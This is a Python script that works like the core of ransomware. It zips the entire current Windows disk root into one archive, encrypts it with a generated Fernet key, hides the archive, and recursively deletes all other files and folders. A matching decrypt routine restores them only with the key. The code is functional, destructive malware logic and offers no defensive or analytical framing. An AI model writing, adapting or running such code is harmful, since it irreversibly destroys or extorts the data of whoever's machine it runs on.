__author__ = "Liam Alon"
__date__ = "25/02/2022"

from cryptography.fernet import Fernet
import os
import shutil
from zip import zip_all,unzip_all


CURRENT_DISK =  os.getcwd().split("\\")[0] +"\\"

ENCRYPTED_FILE_NAME = "EVERYTHING.zip"

def encrypt(CLIENT_KEY):    

    """
    --> Function to encrypt the whole disk <--
    --> It's zipps all of the files to one folder name EVERYTHING.zip <--
    --> then encrypts all the data inside <--
    """

    zip_all(CURRENT_DISK)

    # using the generated key
    fernet = Fernet(CLIENT_KEY)

    # opening the original file to encrypt
    with open(ENCRYPTED_FILE_NAME, 'rb') as file:
        original = file.read()
        
    # encrypting the file
    encrypted = fernet.encrypt(original)

    # opening the file in write mode and
    # writing the encrypted data
    with open(ENCRYPTED_FILE_NAME, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

    os.system('attrib +h ' + "EVERYTHING.zip")

    remove_all()

    return CLIENT_KEY

def decrypt(CLIENT_KEY):
    """
    --> Opens the zipped file <--
    --> Decrypting all the data on the file back to original <--
    --> Unzipping the file to reveal data <--
    """

    os.system('attrib -h ' + "EVERYTHING.zip")

    fernet = Fernet(CLIENT_KEY)

    # opening the encrypted file
    with open(ENCRYPTED_FILE_NAME, 'rb') as enc_file:
        encrypted = enc_file.read()

    # decrypting the file
    decrypted = fernet.decrypt(encrypted)

    # opening the file in write mode and
    # writing the decrypted data
    with open(ENCRYPTED_FILE_NAME, 'wb') as dec_file:
        dec_file.write(decrypted)
    
    unzip_all(CURRENT_DISK)

    cleanup()

def remove_all():
    """
    --> Removes all files after encryption so no one can get them <--
    --> Avoiding the encrypted zip file and the security code to open them <--
    """
    
    """
    remove all dirs by putting CURR_DIR in dir
    """

    dir = CURRENT_DISK

    for files in os.listdir(dir):
        path = os.path.join(dir, files)
        if "EVERYTHING.zip" != files and "Asset" != files and "SSDclient.py" != files:
            try:
                shutil.rmtree(path)
            except OSError:
                os.remove(path)

def cleanup():
    """
    --> remove zipped file after decryption so no one will see <--
    """
    
    path =CURRENT_DISK+"\\EVERYTHING.zip"
    os.remove(path)

def create_key():
    
    """
    --> Creates a key per client <--
    """

    # key generation

    return Fernet.generate_key()

if __name__ == "__main__":
    k = create_key()
    encrypt(k)
    input()
    decrypt(k)